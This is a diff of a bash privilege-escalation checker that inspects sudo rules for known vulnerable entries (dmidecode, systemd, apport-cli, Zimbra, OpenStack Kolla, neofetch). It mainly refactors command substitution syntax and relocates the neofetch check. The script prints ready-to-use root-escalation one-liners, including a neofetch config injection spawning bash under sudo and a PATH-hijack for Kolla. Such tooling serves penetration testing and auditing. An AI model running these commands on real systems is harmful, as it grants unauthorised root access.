@@ -99,12 +99,12 @@ fi
 
 # CVE-2023-30630 - dmidecode
 
-check1=`/usr/sbin/dmidecode -V`
-check2=`echo "$cmd" 2>/dev/null | grep -i "dmidecode" | grep -i "(ALL\|(root"`
-chk3=`compare_versions "$cversion" "$vversion" "Dmidecode"`
-check3=`echo $chk3 | grep -v "NOT"`
+check1=$(/usr/sbin/dmidecode -V)
+check2=$(echo "$cmd" 2>/dev/null | grep -i "dmidecode" | grep -i "(ALL\|(root")
+chk3=$(compare_versions "$cversion" "$vversion" "Dmidecode")
+check3=$(echo $chk3 | grep -v "NOT")
 
-dmidecode_version=`/usr/sbin/dmidecode -V`
+dmidecode_version=$(/usr/sbin/dmidecode -V)
 
 cversion=$dmidecode_version
 vversion="3.5"
@@ -129,9 +129,9 @@ fi
 # ------------------------------------------------------
 
 # CVE-2023-26604 - systemd
-check1=`which systemd`
-check2=`systemd --version 2>/dev/null | awk 'NR==1{print $2}'`
-check3=`echo "$cmd" 2>/dev/null | grep -i "systemctl status"`
+check1=$(which systemd)
+check2=$(systemd --version 2>/dev/null | awk 'NR==1{print $2}')
+check3=$(echo "$cmd" 2>/dev/null | grep -i "systemctl status")
 
 if [ -n "$check1" ] && [ -n "$check3" ] ; then
      if (( check2 < 247 )); then
@@ -150,11 +150,11 @@ fi
 
 # CVE-2013-4984 - Sophos Web Appliance
 
-check1=`echo "$cmd" 2>/dev/null | grep -i "sophox"`
-check2=`echo "$cmd" 2>/dev/null | grep -i "sophox-register"`
-check3=`echo "$cmd" 2>/dev/null | grep -i "sophox-remote-assist"`
-check4=`echo "$cmd" 2>/dev/null | grep -i "clear_keys.pl"`
-check5=`echo "$cmd" 2>/dev/null | grep -i "/opt/cma/bin/clear_keys.pl"`
+check1=$(echo "$cmd" 2>/dev/null | grep -i "sophox")
+check2=$(echo "$cmd" 2>/dev/null | grep -i "sophox-register")
+check3=$(echo "$cmd" 2>/dev/null | grep -i "sophox-remote-assist")
+check4=$(echo "$cmd" 2>/dev/null | grep -i "clear_keys.pl")
+check5=$(echo "$cmd" 2>/dev/null | grep -i "/opt/cma/bin/clear_keys.pl")
 
 if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
   
@@ -173,27 +173,8 @@ if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
 fi
 
 
-# ------------------------------------------------------
-
- echo -e "${BOLD}${BLUE} ====== [B] Misconfig related to specific 3rdParty App/Device ====== ${RESET} \n"
- 
-# neofetch
-who=$(whoami)
-check1=`echo "$cmd" 2>/dev/null | grep "XDG_CONFIG_HOME" | grep "env_keep"`
-check2=$(ls /home/$who/.config/neofetch/config.conf 2>/dev/null)
-check3=`echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\""`
-
-if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
-   cmdneo=`echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\"" | cut -d: -f 2- | sed 's/^ //g'`
-   echo -e "${BOLD}${RED}[-] neofetch sudo's rule is vulnerable ${RESET}"
-   echo -e "${BOLD}${GREEN}[-] neofetch is vulnerable to command injection in config file${RESET}"
-   echo -e "[-] $(echo $check3 | sed 's/^ //g')"
-   #echo -e "[*] Exploit: export XDG_CONFIG_HOME=$check2; echo 'exec /bin/bash' >> $check2; sudo $cmdneo \n"
-   echo -e "[*] Exploit: mkdir -p /tmp/cnf/neofetch;export XDG_CONFIG_HOME=/tmp/cnf; echo 'exec /bin/bash' >> /tmp/cnf/neofetch/config.conf; sudo $cmdneo; rm /tmp/cnf/neofetch/config.conf \n"
-fi
-
 # CVE-2023-1326 - apport-cli
-check1=`echo "$cmd" 2>/dev/null | grep "apport-cli" | cut -d ":" -f 2`
+check1=$(echo "$cmd" 2>/dev/null | grep "apport-cli" | cut -d ":" -f 2)
 if [ -n "$check1" ] ; then
   echo -e "${BOLD}${RED}[-] apport-cli is vulnerable ${RESET}"
   echo -e "${BOLD}${GREEN}[-] apport-cli is not recommended to be ran with sudo${RESET}"
@@ -204,7 +185,7 @@ fi
 
 
 # CVE-2022-45153 - saphanabootstrap-formula 
-check1=`echo "$cmd" 2>/dev/null | grep "crm_attribute"`
+check1=$(echo "$cmd" 2>/dev/null | grep "crm_attribute")
 check2=$(which salt-call | sed 's/ //g')
 check3a=$(lsb_release -a 2>/dev/null | grep -i Description | grep -i "SUSE Linux Enterprise Server for SAP Applications 15 SP1\|SUSE Linux Enterprise Server 12 SP5")
 check3b=$(cat /etc/os-release | grep -i PRETTY_NAME | grep -i "openSUSE Leap 15.4")
@@ -224,7 +205,7 @@ if [ -n "$check1" ] && [ -n "$check2" ] ; then
 fi
 
 # CVE-2022-37393 - Zimbra
-check1=`echo "$cmd" 2>/dev/null | grep "/opt/zimbra/libexec/zmslapd"`
+check1=$(echo "$cmd" 2>/dev/null | grep "/opt/zimbra/libexec/zmslapd")
 check2=$(cat /etc/passwd | cut -d ":" -f 1 | grep -i zimbra)
 #check3=$(su - zimbra -c "zmcontrol -v" | sed -r 's/([^0-9]*)([0-9].[0-9].[0-9])(.*)/2/')
 check3=$(su - zimbra -c "zmcontrol -v" 2>/dev/null | sed 's/Release//g' | cut -d . -f 1,2,3,4 | sed 's/^ //g' )
@@ -238,8 +219,8 @@ fi
 
 
 # CVE-2022-38060 - OpenStack Kolla 
-check1=`echo "$cmd" 2>/dev/null | grep "kolla_copy_cacerts" | grep -i "setenv" | awk '{ print $NF}' | sed 's/^ //g'`
-check2=`echo "$cmd" 2>/dev/null | grep -i Defaults -A 5 | grep -i "setenv"`
+check1=$(echo "$cmd" 2>/dev/null | grep "kolla_copy_cacerts" | grep -i "setenv" | awk '{ print $NF}' | sed 's/^ //g')
+check2=$(echo "$cmd" 2>/dev/null | grep -i Defaults -A 5 | grep -i "setenv")
  
  if [ -n "$check1" ] || [ -n "$check2" ] ; then
      echo -e "${BOLD}${RED}[-] OpenStack Kolla  is vulnerable to path hijacking! ${RESET}"
@@ -247,6 +228,32 @@ check2=`echo "$cmd" 2>/dev/null | grep -i Defaults -A 5 | grep -i "setenv"`
      echo -e "[-] $(echo "$cmd" | grep -i 'kolla_copy_cacerts' | sed 's/^ //g')"
      echo -e "[*] Exploit: echo '#!/bin/bash' > /tmp/update-ca-certificates;echo 'id' >> /tmp/update-ca-certificates; chmod +x /tmp/update-ca-certificates; sudo PATH=/tmp:\$PATH $check1 ; rm /tmp/update-ca-certificates\n"
  fi
+
+# ------------------------------------------------------
+
+ echo -e "${BOLD}${BLUE} ====== [B] Misconfig related to 3rdParty App/Device (No CVE assigned) ====== ${RESET} \n"
+ 
+# neofetch
+who=$(whoami)
+check1=$(echo "$cmd" 2>/dev/null | grep "XDG_CONFIG_HOME" | grep "env_keep")
+check2=$(ls /home/$who/.config/neofetch/config.conf 2>/dev/null)
+#check3=$(echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\"")
+check3=$(echo "$cmd" 2>/dev/null | grep "neofetch")
+
+#echo $check1
+#echo $check2
+#echo $check3
+
+if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
+   cmdneo=$(echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\"" | cut -d: -f 2- | sed 's/^ //g')
+   echo -e "${BOLD}${RED}[-] neofetch sudo's rule is vulnerable ${RESET}"
+   echo -e "${BOLD}${GREEN}[-] neofetch is vulnerable to command injection in config file${RESET}"
+   echo -e "[-] $(echo $check3 | sed 's/^ //g')"
+   #echo -e "[*] Exploit: export XDG_CONFIG_HOME=$check2; echo 'exec /bin/bash' >> $check2; sudo $cmdneo \n"
+   echo -e "[*] Exploit: mkdir -p /tmp/cnf/neofetch;export XDG_CONFIG_HOME=/tmp/cnf; echo 'exec /bin/bash' >> /tmp/cnf/neofetch/config.conf; sudo $cmdneo; rm /tmp/cnf/neofetch/config.conf \n"
+fi
+
+
 
 
 # ------------------------------------------------------
@@ -260,7 +267,7 @@ check2=$(echo "$cmd" 2>/dev/null | grep "\.go")
 
 if [ -n "$check1" ] && [ -n "$check2" ] ; then
    
-    goscriptpath=`echo "$cmd" 2>/dev/null | grep .go | cut -d: -f 2 | sed 's/ /\n/g' | grep "\.go$"`
+    goscriptpath=$(echo "$cmd" 2>/dev/null | grep .go | cut -d: -f 2 | sed 's/ /\n/g' | grep "\.go$")
     if [ -n "$goscriptpath" ] ; then
         for gospath in $goscriptpath; do        
             # if /bin/bash or /bin/sh then check if second argument has /
